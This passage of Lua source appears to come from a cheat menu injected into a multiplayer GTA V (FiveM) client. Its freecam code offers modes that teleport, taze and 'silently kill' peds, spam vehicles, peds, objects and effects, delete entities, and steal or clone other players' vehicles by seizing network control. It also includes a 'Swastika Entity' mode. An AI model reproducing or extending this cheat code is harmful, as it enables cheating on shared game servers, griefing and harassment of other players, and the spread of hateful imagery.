                    wmlua.F.DrawEntityBox(entity, 20,20,20,100)
                    wmlua.F.vDrawText3D(hitCoords.x, hitCoords.y, hitCoords.z + 2.0, "Health: " .. wmlua.N.GetEntityHealth(entity) .. "\nSpeed: " .. wmlua.F.Round(wmlua.N.GetEntitySpeed(entity), 2) .. "\nPosition: " .. wmlua.F.Round(wmlua.N.GetEntityPos(entity).x, 2) .. ", " .. wmlua.F.Round(wmlua.N.GetEntityPos(entity).y, 2) .. ", " .. wmlua.F.Round(wmlua.N.GetEntityPos(entity).z, 2) .. "\n" .. entity, {255,255,255,255})
                else
                    wmlua.F.vDrawText3D(hitCoords.x, hitCoords.y, hitCoords.z + 2.0, "X: " .. wmlua.F.Round(hitCoords.x, 2) .. " Y: " .. wmlua.F.Round(hitCoords.y, 2) .. " Z: " .. wmlua.F.Round(hitCoords.z, 2), {255,255,255,255}, 2)
                end
            end
    
            if wmlua.menu.v.drawmenu == false and wmlua.F.PressedCTRL(0, 39) then
    
                wmlua.T.Freecam_Config.Mode = wmlua.T.Freecam_Config.Mode - 1
                if wmlua.T.Freecam_Config.Mode < 1 then
                    wmlua.T.Freecam_Config.Mode = #wmlua.T.FreecamModes
                end
                wmlua.F.EventLogInsert("[~b~WM~w~] Freecam Mode: " .. wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode], 2000)
                if wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] == "Silent Kill" then
                    wmlua.F.EventLogInsert("[~b~WM~w~] Press LSHIFT + LMB to activate, LMB to Kill peds.")
                end
    
            end
    
            if wmlua.menu.v.drawmenu == false and wmlua.F.PressedCTRL(0, 40) then
    
                wmlua.T.Freecam_Config.Mode = wmlua.T.Freecam_Config.Mode + 1
                if wmlua.T.Freecam_Config.Mode > #wmlua.T.FreecamModes then
                    wmlua.T.Freecam_Config.Mode = 1
                end
                wmlua.F.EventLogInsert("[~b~WM~w~] Freecam Mode: " .. wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode], 2000)
                if wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] == "Silent Kill" then
                    wmlua.F.EventLogInsert("[~b~WM~w~] Press LSHIFT + LMB to spawn el ped")
                end
    
            end
    
            if wmlua.menu.v.drawmenu == false and hitCoords ~= vector3(0,0,0) then
    
                if wmlua.F.PressedCTRL(0, 25) then
                    wmlua.V.Freecam_EntToDrag = entity
                end
                if wmlua.F.ReleasedCTRL(0, 25) then
                    wmlua.V.Freecam_EntToDrag = nil
                end
    
                if wmlua.V.Freecam_EntToDrag and wmlua.N.IsEntityAVehicle(wmlua.V.Freecam_EntToDrag) or wmlua.N.IsEntityAnObject(wmlua.V.Freecam_EntToDrag) or wmlua.N.IsEntityAPed(wmlua.V.Freecam_EntToDrag) and wmlua.N.IsPedAPlayer(wmlua.V.Freecam_EntToDrag) == false then
    
                    wmlua_Thread(function() -- ooga booga, request control has a wait so, let's thread dis bitch lmao so cam doesnt lock up
                        wmlua.F.RequestControl(wmlua.V.Freecam_EntToDrag)
                        wmlua.H.WMInvokeNative(0x06843DA7060A026B, wmlua.V.Freecam_EntToDrag, hitCoords)
                        wmlua.N.SetEntityHeading(wmlua.V.Freecam_EntToDrag, wmlua.N.GetCamHeading(wmlua.V.Freecam))
                    end)
    
                end
    
            elseif wmlua.F.ReleasedCTRL(0, 25) then
                wmlua.V.Freecam_EntToDrag = nil
            end
    
            if wmlua.N.DoesEntityExist(wmlua.V.NPCKillerPed) then
                wmlua.H.WMInvokeNative(0xB69317BF5E782347, wmlua.V.NPCKillerPed)
                local cx,cy,cz = table.unpack(wmlua.N.GetCamPos(wmlua.V.Freecam))
                local b, gz = wmlua.N.GetGroundZFor_3dCoord(cx,cy,cz, 0)
                --wmlua.menu.f.drawtext({text = GetPlayerName(NetworkGetEntityOwner(wmlua.V.NPCKillerPed)), x = 0.51, y = 0.51, scale = 0.1, size = 0.35, font = 4}, {red = 255, green = 0, blue = 50, alpha = 255})
                wmlua.H.WMInvokeNative(0x06843DA7060A026B, wmlua.V.NPCKillerPed, cx,cy,gz - 50.0)
                wmlua.N.SetEntityHeading(wmlua.V.NPCKillerPed, wmlua.N.GetCamHeading(wmlua.V.Freecam))
                wmlua.N.WadaGM(wmlua.V.NPCKillerPed, true, 21.1337)
            end
            
            if wmlua.menu.v.drawmenu == false and hitCoords ~= vector3(0,0,0) and wmlua.F.PressedCTRL(0, 24) and wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] == "Teleport" then -- Freecam Teleport
    
                if wmlua.N.DoesEntityExist(entity) and wmlua.N.IsEntityAVehicle(entity) then
                    if wmlua.F.HoldingCTRL(0, 21) then
                        wmlua.V.ped = wmlua.N.GetPedInVehicleSeat(entity, -1)
                        wmlua.N.Clear_PedTasks(wmlua.V.ped, true)
                    end
                    if wmlua.N.IsVehicleSeatFree(entity, -1) then
                        wmlua.N.TaskWarpPedIntoVehicle(wmlua.N.GetPlayerPed(), entity, -1)
                    else
                        wmlua.N.TaskWarpPedIntoVehicle(wmlua.N.GetPlayerPed(), entity, -2)
                    end
                    wmlua.F.EventLogInsert("[~b~WM~w~] Teleported in vehicle", 1000)
                else
                    wmlua.F.TeleportToCoords(table.unpack(hitCoords))
                    wmlua.F.EventLogInsert("[~b~WM~w~] Teleported to " .. hitCoords, 1000)
                end
    
            end
    
            if wmlua.menu.v.drawmenu == false and hitCoords ~= vector3(0,0,0) and wmlua.F.HoldingCTRL(0, 21) and wmlua.F.HoldingCTRL(0, 24) and wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] == "Taze" then -- Freecam Taze
                if wmlua.N.IsEntityAPed(entity) then
                    wmlua.V.tpxyz = wmlua.N.GetEntBonePos(entity, 31086)
                    wmlua.V.tx, wmlua.V.ty, wmlua.V.tz = table.unpack(wmlua.V.tpxyz)
                    wmlua.H.WMInvokeNative(0x867654CBC7606F2C, wmlua.V.tx - 0.1, wmlua.V.ty - 0.1, wmlua.V.tz - 0.1, wmlua.V.tx, wmlua.V.ty, wmlua.V.tz, 0.0, true, wmlua.N.GetHashKey("weapon_stungun"), wmlua.N.GetPlayerPed(), true, false, 1.0)
                else
                    wmlua.H.WMInvokeNative(0x867654CBC7606F2C, hitCoords.x - 0.1, hitCoords.y - 0.1, hitCoords.z + 0.1, hitCoords.x, hitCoords.y, hitCoords.z, 0.000000000000000001, true, wmlua.N.GetHashKey("weapon_stungun"), wmlua.N.GetPlayerPed(), true, false, 1.0)
                end
            elseif wmlua.menu.v.drawmenu == false and hitCoords ~= vector3(0,0,0) and wmlua.F.PressedCTRL(0, 24) and wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] == "Taze" then
                if wmlua.N.IsEntityAPed(entity) then
                    wmlua.V.tpxyz = wmlua.N.GetEntBonePos(entity, 31086)
                    wmlua.V.tx, wmlua.V.ty, wmlua.V.tz = table.unpack(wmlua.V.tpxyz)
                    wmlua.H.WMInvokeNative(0x867654CBC7606F2C, wmlua.V.tx - 0.1, wmlua.V.ty - 0.1, wmlua.V.tz - 0.1, wmlua.V.tx, wmlua.V.ty, wmlua.V.tz, 0.0, true, wmlua.N.GetHashKey("weapon_stungun"), wmlua.N.GetPlayerPed(), true, false, 1.0)
                else
                    wmlua.H.WMInvokeNative(0x867654CBC7606F2C, hitCoords.x - 0.1, hitCoords.y - 0.1, hitCoords.z + 0.1, hitCoords.x, hitCoords.y, hitCoords.z, 0.000000000000000001, true, wmlua.N.GetHashKey("weapon_stungun"), wmlua.N.GetPlayerPed(), true, false, 1.0)
                end
            end
    
            if wmlua.menu.v.drawmenu == false and hitCoords ~= vector3(0,0,0) and wmlua.F.PressedCTRL(0, 24) and wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] == "Vehicle Spawner" then -- Freecam Vehicle Spawner
                
                wmlua_Thread(function()
                    wmlua.V.Car = wmlua.F.GetInput("Enter Car Spawn Name")
                    wmlua.V.CarColor = wmlua.F.Split(wmlua.F.GetInput("Enter Color in RGB"), ',')
                    wmlua.V.vehiclehash = wmlua.N.GetHashKey(wmlua.V.Car)
                    wmlua.V.spveh = wmlua.N.SpawnVeh(wmlua.V.vehiclehash, hitCoords, wmlua.N.GetCamRot(wmlua.V.Freecam, 2), 1, 0)
                    wmlua.N.SetEntityHeading(wmlua.V.spveh, wmlua.N.GetCamHeading(wmlua.V.Freecam))
                    wmlua.N.SetVehicleExtraColours(wmlua.V.spveh, 0, 0)
                    wmlua.N.SetVehicleCustomPrimaryColour(wmlua.V.spveh, tonumber(wmlua.V.CarColor[1]), tonumber(wmlua.V.CarColor[2]), tonumber(wmlua.V.CarColor[3]))
                    wmlua.N.SetVehicleCustomSecondaryColour(wmlua.V.spveh, tonumber(wmlua.V.CarColor[1]), tonumber(wmlua.V.CarColor[2]), tonumber(wmlua.V.CarColor[3]))
                end)

            end
    
            if wmlua.menu.v.drawmenu == false and hitCoords ~= vector3(0,0,0) and wmlua.F.HoldingCTRL(0, 24) and wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] == "Vehicle Spammer" then -- Freecam Vehicle Spammer
    
                wmlua_Thread(function()
                    wmlua.V.Car = wmlua.ST.SpamCars[math.random(1, #wmlua.ST.SpamCars)]
                    wmlua.V.spveh = wmlua.N.SpawnVeh(wmlua.V.Car, hitCoords, wmlua.N.GetCamRot(wmlua.V.Freecam, 2), 1, 0)
                    wmlua.N.SetEntityHeading(wmlua.V.spveh, wmlua.N.GetCamHeading(wmlua.V.Freecam))
                end)
    
            end
    
            if wmlua.menu.v.drawmenu == false and hitCoords ~= vector3(0,0,0) and wmlua.F.PressedCTRL(0, 24) and wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] == "Ped Spawner" then -- Freecam Ped Spawner
                
                wmlua_Thread(function()
                    wmlua.V.Pedname = wmlua.F.GetInput("Enter Ped Name")
                    wmlua.V.Pedcount = wmlua.F.GetInput("Enter Ped Count")
                    wmlua.V.pedhash = wmlua.N.GetHashKey(wmlua.V.Pedname)
                    for i = 1, tonumber(wmlua.V.Pedcount) do
                        wmlua.V.spped = wmlua.N.SpawnPed(5, wmlua.V.pedhash, hitCoords, wmlua.N.GetCamRot(wmlua.V.Freecam, 2), 1, 1)
                        wmlua.N.SetEntityHeading(wmlua.V.spped, wmlua.N.GetCamHeading(wmlua.V.Freecam))
                    end
                end)
    
            end
    
            if wmlua.menu.v.drawmenu == false and hitCoords ~= vector3(0,0,0) and wmlua.F.HoldingCTRL(0, 24) and wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] == "Ped Spammer" then -- Freecam Ped Spammer
    
                wmlua_Thread(function()
    
                    wmlua.V.Pedname = wmlua.ST.SpamPeds[math.random(1, #wmlua.ST.SpamPeds)]
                    wmlua.V.spped = wmlua.N.SpawnPed(5, wmlua.V.Pedname, hitCoords, wmlua.N.GetCamRot(wmlua.V.Freecam, 2), 1, 1)
                    wmlua.N.SetEntityHeading(wmlua.V.spped, wmlua.N.GetCamHeading(wmlua.V.Freecam))
                    
                end)
    
            end
    
            if wmlua.menu.v.drawmenu == false and hitCoords ~= vector3(0,0,0) and wmlua.F.HoldingCTRL(0, 24) and wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] == "Object Spawner" then -- Freecam Obj Spawner
    
                wmlua_Thread(function()

                    wmlua.V.Objname = wmlua.F.GetInput("Enter Object Name")
                    wmlua.V.objhash = wmlua.N.GetHashKey(wmlua.V.Objname)
                    wmlua.V.spobj = wmlua.N.SpawnObj(wmlua.V.objhash, hitCoords.x, hitCoords.y, hitCoords.z - 0.6, true, true, false)
                    wmlua.N.PlaceObjectOnGroundProperly(wmlua.V.spobj)
                    wmlua.N.SetEntityHeading(wmlua.V.spobj, wmlua.N.GetCamHeading(wmlua.V.Freecam))
                
                end)
                
            end
    
            if wmlua.menu.v.drawmenu == false and hitCoords ~= vector3(0,0,0) and wmlua.F.HoldingCTRL(0, 24) and wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] == "Object Spammer" then -- Freecam Obj Spammer
    
                wmlua_Thread(function()
    
                    wmlua.V.Objname = wmlua.ST.SpamObjs[math.random(1, #wmlua.ST.SpamObjs)]
                    wmlua.V.spobj = wmlua.N.SpawnObj(wmlua.V.Objname, hitCoords.x, hitCoords.y, hitCoords.z - 0.6, true, true, false)
                    wmlua.N.SetEntityHeading(wmlua.V.spobj, wmlua.N.GetCamHeading(wmlua.V.Freecam))
                    
                end)
    
            end
    
            if wmlua.menu.v.drawmenu == false and hitCoords ~= vector3(0,0,0) and wmlua.F.HoldingCTRL(0, 24) and wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] == "Entity Deleter" then
                wmlua_Thread(function()
                    if wmlua.N.IsEntityAVehicle(entity) then
                        wmlua.V.MaxSeats = wmlua.H.WMInvokeNative(0x2AD93716F184EDA4, wmlua.N.GetEntityModel(entity))
                        if type(wmlua.V.MaxSeats) == "number" then
                            for i = -1, wmlua.V.MaxSeats do
                                wmlua.N.Clear_PedTasks(wmlua.N.GetPedInVehicleSeat(k, i), true)
                            end
                        end
                    end
                    if wmlua.N.IsPedAPlayer(entity) == false and wmlua.N.IsEntityAPed(entity) or wmlua.N.IsEntityAnObject(entity) or wmlua.N.IsEntityAVehicle(entity) then
                        for i = 1, 5 do
                            wmlua.N.NetworkRequestControlOfNetworkId(NetworkGetNetworkIdFromEntity(entity))
                            wmlua.F.RequestControl(entity)
                            wmlua.N.SetEntityAsMissionEntity(entity)
                            wmlua.N.SetEntityAsNoLongerNeeded(entity)
                            wmlua.N.DeleteVehicle(entity)
                            wmlua.N.DeleteEntity(entity)
                            wmlua_Schleep(250)
                        end
                    end
                end)
            end
    
            if wmlua.menu.v.drawmenu == false and hitCoords ~= vector3(0,0,0) and wmlua.F.HoldingCTRL(0, 24) and wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] == "SFX Spammerino" then 
    
                wmlua_Thread(function()
    
                    for i = 1, #wmlua.ST.SpamSfx do
                        wmlua.N.RequestPTFX(wmlua.ST.SpamSfx[i].c1)
                        wmlua.N.UsePTFX(wmlua.ST.SpamSfx[i].c1)
                        wmlua.N.SpawnPTFX(wmlua.ST.SpamSfx[i].c2, hitCoords, 0.0, 0.0, 0.0, wmlua.ST.SpamSfx[i].size, false, false, false)
                    end
    
                end)
    
            end
    
            if wmlua.menu.v.drawmenu == false and hitCoords ~= vector3(0,0,0) and wmlua.F.PressedCTRL(0, 24) and wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] == "Swastika Entity" then -- Freecam Swastika Entity
                wmlua.F.SwastikaEntity(entity)
            end
    
            if wmlua.menu.v.drawmenu == false and hitCoords ~= vector3(0,0,0) and wmlua.F.PressedCTRL(0, 24) and wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] == "Ai Vehicle Thief" and wmlua.N.IsEntityAVehicle(entity) then -- Freecam Ai Vehicle Thief
                wmlua_Thread(function()
                    if wmlua.F.HoldingCTRL(0, 21) then
                        wmlua.V.cPModel = wmlua.N.GetHashKey(wmlua.F.GetInput("Model Name"))
                    else
                        wmlua.V.cPModel = 1885233650
                    end
                    pVehicle = entity
                    wmlua.H.WMInvokeNative(0xB69317BF5E782347, pVehicle)
                    taken = false
                    for i = 1, 20 do
                        if not taken and wmlua.V.Active then
                            repeat
                                wmlua.N.DecorSetBool(pVehicle, 'VehicleLocked', false)
                                wmlua.N.SetVehicleDoorsLocked(pVehicle, 1)
                                wmlua.N.SetVehicleDoorsLockedForAllPlayers(pVehicle, false)
                                tPed = wmlua.N.GetPedInVehicleSeat(pVehicle, -1)
                                wmlua.F.RequestControl(pVehicle)
                                wmlua.N.Clear_PedTasks(tPed, true)
                                wmlua.H.WMInvokeNative(0xB69317BF5E782347, pVehicle)
                                wmlua.F.RequestMdl(wmlua.V.cPModel)
                                crazyPed = wmlua.N.CreatePedInsideVehicle(pVehicle, 4, wmlua.V.cPModel, -1, true, true)
                                wmlua_Thread(function()
                                    for i = 1, 20 do
                                        if crazyPed then wmlua.N.TaskWarpPedIntoVehicle(crazyPed, pVehicle, -1) end
                                        wmlua_Schleep(200)
                                    end
                                end)
                                wmlua.F.RequestControl(crazyPed)
                                if aiPedGM == "y" then
                                    wmlua.H.WMInvokeNative(0x3882114BDE571AD4, crazyPed, true)
                                end
                                wmlua.N.SetBlockingOfNonTemporaryEvents(crazyPed, true)
                                wmlua_Thread(function()
                                    for i = 1, 10 do wmlua_Schleep(200)
                                        wmlua.N.TaskVehicleDriveWander(crazyPed, pVehicle, 800.0, 787004)
                                    end
                                end)
                                if crazyPed and wmlua.N.GetPedInVehicleSeat(pVehicle, -1) == crazyPed then
                                    taken = true
                                    if not wmlua.V.Active then
                                        taken = true
                                    end
                                end
                                wmlua_Schleep(150)
                            until taken
                        end
                        if crazyPed then
                            wmlua.F.RequestControl(crazyPed)
                            wmlua.N.SetBlockingOfNonTemporaryEvents(crazyPed, true)
                            wmlua.N.TaskVehicleDriveWander(crazyPed, pVehicle, 800.0, 787004)
                            wmlua.N.SetDriverAbility(crazyPed, 1.0)
                        end
                    end
                end)
            end
    
            if wmlua.menu.v.drawmenu == false and hitCoords ~= vector3(0,0,0) and wmlua.F.HoldingCTRL(0, 21) and wmlua.F.PressedCTRL(0, 24) and wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] == "Spikestrip Spawner" then
    
                for i = 1, #wmlua.T.Spikes do
                    wmlua.F.EventLogInsert("deleting spike")
                    wmlua.F.RequestControl(wmlua.T.Spikes[i])
                    wmlua.N.DeleteEntity(wmlua.T.Spikes[i])
                end
    
            elseif wmlua.menu.v.drawmenu == false and hitCoords ~= vector3(0,0,0) and wmlua.F.PressedCTRL(0, 24) and wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] == "Spikestrip Spawner" then -- Freecam Obj Spawner
    
                wmlua.V.objhash = wmlua.N.GetHashKey("p_ld_stinger_s")
                wmlua.V.spobj = wmlua.N.SpawnObj(wmlua.V.objhash, hitCoords.x, hitCoords.y, hitCoords.z - 0.0, true, true, false)
                wmlua.N.PlaceObjectOnGroundProperly(wmlua.V.spobj)
                wmlua.N.SetEntityHeading(wmlua.V.spobj, wmlua.N.GetCamHeading(wmlua.V.Freecam))
                wmlua.F.InsertToTable(wmlua.T.Spikes, wmlua.V.spobj)
                
            end
    
            if wmlua.menu.v.drawmenu == false and hitCoords ~= vector3(0,0,0) and wmlua.F.PressedCTRL(0, 24) and wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] == "RC Car Entity" then
    
                local lped = wmlua.N.GetPedInVehicleSeat(entity, -1)
                if lped ~= 0 then
                    wmlua.N.Clear_PedTasks(lped, true)
                end
                wmlua_Thread(function() wmlua.P.RCCar.Start(entity) end)
    
            end
                    
            if wmlua.menu.v.drawmenu == false and hitCoords ~= vector3(0,0,0) and wmlua.F.HoldingCTRL(0, 21) and wmlua.F.PressedCTRL(0, 24) and wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] == "Silent Kill" then
    
                wmlua.N.DeleteEntity(wmlua.V.NPCKillerPed)
                local cx,cy,cz = table.unpack(wmlua.N.GetCamPos(wmlua.V.Freecam))
                wmlua.F.RequestMdl(wmlua.N.GetHashKey("a_m_y_beachvesp_01"))
                wmlua.V.NPCKillerPed = wmlua.N.SpawnPed(5, wmlua.N.GetHashKey("a_m_y_beachvesp_01"), cx, cy + 2.0, cz, 0.0, true, true)
                wmlua.N.SetEntityHeading(wmlua.V.NPCKillerPed, wmlua.N.GetCamHeading(wmlua.V.Freecam))
                wmlua.F.EventLogInsert('[~b~WM~w~] Spawned Killer')
    
            elseif wmlua.menu.v.drawmenu == false and hitCoords ~= vector3(0,0,0) and wmlua.F.PressedCTRL(0, 24) and wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] == "Silent Kill" then
    
                if wmlua.N.IsEntityAPed(entity) then
                    local cx,cy,cz = table.unpack(wmlua.N.GetCamPos(wmlua.V.Freecam))
                    wmlua.V.tpxyz = wmlua.N.GetEntBonePos(entity, 31086)
                    wmlua.V.tx, wmlua.V.ty, wmlua.V.tz = table.unpack(wmlua.V.tpxyz)
                    wmlua.H.WMInvokeNative(0x867654CBC7606F2C, cx, cy, cz, wmlua.V.tx, wmlua.V.ty, wmlua.V.tz, 11110.0, true, wmlua.N.GetHashKey("weapon_pistol"), wmlua.V.NPCKillerPed, false, true, 999999999.0)
                    wmlua.F.EventLogInsert('kek2')
                end
                
            end
    
            if wmlua.menu.v.drawmenu == false and hitCoords ~= vector3(0,0,0) and wmlua.F.HoldingCTRL(0, 21) and wmlua.F.PressedCTRL(0, 24) and wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] == "Vehicle Cloner" then
    
                if wmlua.F.RequestMdl(wmlua.T.VehicleCloneProps.model) then
                    local x,y,z = table.unpack(hitCoords)
                    local clonedVeh = wmlua.N.SpawnVeh(wmlua.T.VehicleCloneProps.model, x, y, z, 0.0, true, true)
                    wmlua.N.SetEntityHeading(clonedVeh, wmlua.N.GetCamHeading(wmlua.V.Freecam))
                    wmlua.N.SetVehicleModKit(clonedVeh, 0)
                    wmlua.N.SetVehicleNumberPlateText(clonedVeh, wmlua.T.VehicleCloneProps.plate)
                    wmlua.N.SetVehicleNumberPlateTextIndex(clonedVeh, wmlua.T.VehicleCloneProps.plateindex)
                    wmlua.N.SetVehicleColours(clonedVeh, wmlua.T.VehicleCloneProps.colors.c1, wmlua.T.VehicleCloneProps.colors.c2)
                    wmlua.N.SetVehicleExtraColours(clonedVeh, wmlua.T.VehicleCloneProps.colors.c3, wmlua.T.VehicleCloneProps.colors.c4)
                    for i = 1, #wmlua.T.VehicleCloneProps.mods do
                        wmlua.N.SetVehicleMod(clonedVeh, wmlua.T.VehicleCloneProps.mods[i].index, wmlua.T.VehicleCloneProps.mods[i].modval, false)
                    end
                    for i = 1, #wmlua.T.VehicleCloneProps.togglemods do
                        wmlua.N.ToggleVehicleMod(clonedVeh, wmlua.T.VehicleCloneProps.togglemods[i].index, wmlua.T.VehicleCloneProps.togglemods[i].modval)
                    end
                    if wmlua.T.VehicleCloneProps.neons then
                        SetVehicleNeonLightsColour(clonedVeh, wmlua.T.VehicleCloneProps.neoncolor.r, wmlua.T.VehicleCloneProps.neoncolor.g, wmlua.T.VehicleCloneProps.neoncolor.b)
                        for i = 1, #wmlua.T.VehicleCloneProps.neons do
                            SetVehicleNeonLightEnabled(clonedVeh, wmlua.T.VehicleCloneProps.neons[i].index, wmlua.T.VehicleCloneProps.neons[i].modval)
                        end
                    end
                    for i = 1, #wmlua.T.VehicleCloneProps.extras do
                        if wmlua.T.VehicleCloneProps.extras[i].modval then
                            SetVehicleExtra(clonedVeh, wmlua.T.VehicleCloneProps.extras[i].index, false)
                        else
                            SetVehicleExtra(clonedVeh, wmlua.T.VehicleCloneProps.extras[i].index, true)
                        end
                    end
                    if wmlua.T.VehicleCloneProps.cc1 then
                        wmlua.N.SetVehicleCustomPrimaryColour(clonedVeh, wmlua.T.VehicleCloneProps.cc1.r, wmlua.T.VehicleCloneProps.cc1.g, wmlua.T.VehicleCloneProps.cc1.b)
                    end
                    if wmlua.T.VehicleCloneProps.cc2 then
                        wmlua.N.SetVehicleCustomSecondaryColour(clonedVeh, wmlua.T.VehicleCloneProps.cc2.r, wmlua.T.VehicleCloneProps.cc2.g, wmlua.T.VehicleCloneProps.cc2.b)
                    end
                end
    
            elseif wmlua.menu.v.drawmenu == false and hitCoords ~= vector3(0,0,0) and wmlua.F.PressedCTRL(0, 24) and wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] == "Vehicle Cloner" then
    
                if wmlua.N.IsEntityAVehicle(entity) then
                    wmlua_Thread(function()
                        wmlua.T.VehicleCloneProps = {}
                        wmlua.T.VehicleCloneProps.mods = {}
                        wmlua.T.VehicleCloneProps.togglemods = {}
                        wmlua.T.VehicleCloneProps.extras = {}
                        wmlua.T.VehicleCloneProps.colors = {}
                        wmlua.T.VehicleCloneProps.plate = ""
                        wmlua.T.VehicleCloneProps.model = wmlua.N.GetEntityModel(entity)
                        wmlua.T.VehicleCloneProps.plate = GetVehicleNumberPlateText(entity)
                        wmlua.T.VehicleCloneProps.plateindex = GetVehicleNumberPlateTextIndex(entity)
                        wmlua.F.RequestControl(entity)
                        wmlua.N.SetVehicleModKit(entity, 0)
                        wmlua.V.VC1, wmlua.V.VC2 = GetVehicleColours(entity)
                        wmlua.V.VC3, wmlua.V.VC4 = GetVehicleExtraColours(entity)
                        wmlua.T.VehicleCloneProps.colors = {c1 = wmlua.V.VC1, c2 = wmlua.V.VC2, c3 = wmlua.V.VC3, c4 = wmlua.V.VC4}
                        if GetIsVehiclePrimaryColourCustom(entity) then
                            wmlua.T.VehicleCloneProps.cc1 = {}
                            wmlua.T.VehicleCloneProps.cc1.r, wmlua.T.VehicleCloneProps.cc1.g, wmlua.T.VehicleCloneProps.cc1.b = GetVehicleCustomPrimaryColour(entity)
                        end
                        if GetIsVehicleSecondaryColourCustom(entity) then
                            wmlua.T.VehicleCloneProps.cc2 = {}
                            wmlua.T.VehicleCloneProps.cc2.r, wmlua.T.VehicleCloneProps.cc2.g, wmlua.T.VehicleCloneProps.cc2.b = GetVehicleCustomSecondaryColour(entity)
                        end
                        if wmlua.N.IsVehicleNeonLightEnabled(entity) then
                            wmlua.T.VehicleCloneProps.neons = {}
                            local r,g,b = wmlua.N.GetVehicleNeonLightsColor(entity)
                            wmlua.T.VehicleCloneProps.neoncolor = {r = r, g = g, b = b}
                            for i = 0, 3 do
                                wmlua.F.InsertToTable(wmlua.T.VehicleCloneProps.neons, {index = i, modval = wmlua.N.IsVehicleNeonLightEnabled(entity, i)})
                            end
                        end
                        for i = 0, 49 do
                            wmlua.F.InsertToTable(wmlua.T.VehicleCloneProps.mods, {index = i, modval = wmlua.N.GetVehicleMod(entity, i)})
                        end
                        for i = 0, 20 do
                            wmlua.F.InsertToTable(wmlua.T.VehicleCloneProps.extras, {index = i, modval = wmlua.N.IsVehicleExtraTurnedOn(entity, i)})
                        end
                        for i = 15, 20 do
                            if wmlua.N.IsToggleModOn(entity, i) then
                                wmlua.F.InsertToTable(wmlua.T.VehicleCloneProps.togglemods, {index = i, modval = true})
                            end
                        end
                        wmlua.F.EventLogInsert('[~b~WM~w~] Vehicle cloned, press LSHIFT + LMB To spawn', 6000)
                    end)
                end
    
            end
    
            if wmlua.menu.v.drawmenu == false and hitCoords ~= vector3(0,0,0) and wmlua.F.PressedCTRL(0, 24) and wmlua.T.FreecamModes[wmlua.T.Freecam_Config.Mode] == "aithief2" and wmlua.N.IsEntityAVehicle(entity) then -- Freecam Ai Vehicle Thief
                wmlua_Thread(function()
                    wmlua.T.PedsList = wmlua.N.GetEntList("CPed")
                    wmlua.V.crazyPed = wmlua.T.PedsList[#wmlua.T.PedsList]
                    wmlua.N.TaskVehicleDriveWander(wmlua.V.crazyPed, entity, 800.0, 787004)
                end)
            end

        --end)
    end

    wmlua.V.Tings = 0
    wmlua.T.Balls = {}

    function wmlua.F.getMouseMovement()
        local x = wmlua.N.GetDisabledControlNormal(0, 2)
        local y = 0
        local z = wmlua.N.GetDisabledControlNormal(0, 1)
        return vector3(-x, y, -z) * wmlua.T.Freecam_Config.Sensitivity
    end

    function wmlua.F.getRelativeLocation(location, rotation, distance)
        location = location or vector3(0,0,0)
        rotation = rotation or vector3(0,0,0)
        distance = distance or 10.0

        local tZ = math.rad(rotation.z)
        local tX = math.rad(rotation.x)

        local absX = math.abs(math.cos(tX))

        local rx = location.x + (-math.sin(tZ) * absX) * distance
        local ry = location.y + (math.cos(tZ) * absX) * distance
        local rz = location.z + (math.sin(tX)) * distance

        return vector3(rx,ry,rz)
    end

    function wmlua.F.getMovementInput(location, rotation, frameTime)
        local multiplier = 1.0
        if wmlua.F.HoldingCTRL(0, wmlua.T.Freecam_Config.Keys.Boost) then
            multiplier = wmlua.T.Freecam_Config.BoostFactor
        end

        if wmlua.F.HoldingCTRL(0, wmlua.T.Freecam_Config.Keys.Right) then
            local camRot = vector3(0,0,rotation.z)
            location = wmlua.F.getRelativeLocation(location, camRot + vector3(0,0,-90), wmlua.V.CAM_SPEED * frameTime * multiplier)
        elseif wmlua.F.HoldingCTRL(0, wmlua.T.Freecam_Config.Keys.Left) then
            local camRot = vector3(0,0,rotation.z)
            location = wmlua.F.getRelativeLocation(location, camRot + vector3(0,0,90), wmlua.V.CAM_SPEED * frameTime * multiplier)
        end

        if wmlua.F.HoldingCTRL(0, wmlua.T.Freecam_Config.Keys.Forward) then
            location = wmlua.F.getRelativeLocation(location, rotation, wmlua.V.CAM_SPEED * frameTime * multiplier)
        elseif wmlua.F.HoldingCTRL(0, wmlua.T.Freecam_Config.Keys.Back) then
            location = wmlua.F.getRelativeLocation(location, rotation, -wmlua.V.CAM_SPEED * frameTime * multiplier)
        end

        if wmlua.F.HoldingCTRL(0, wmlua.T.Freecam_Config.Keys.Up) then
            location = location + vector3(0,0,wmlua.V.CAM_SPEED * frameTime * multiplier)
        elseif wmlua.F.HoldingCTRL(0, wmlua.T.Freecam_Config.Keys.Down) then
            location = location + vector3(0,0,-wmlua.V.CAM_SPEED * frameTime * multiplier)
        end

        return location
    end

    function wmlua.F.DeleteCam()
        wmlua.N.RenderCam(false, false, 0, false, false, false)
        wmlua.N.DestroyCam(wmlua.V.Freecam, false)
        wmlua.N.UnlockMinimapPosition()
    end

    wmlua_Thread(function()

        while wmlua_Schleep ~= nil do

            local _, error = wmlua_pcall(function() wmlua_Schleep(1000)

                wmlua.F.WMBlips()

                if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Mal_tazeplayers"]].active then

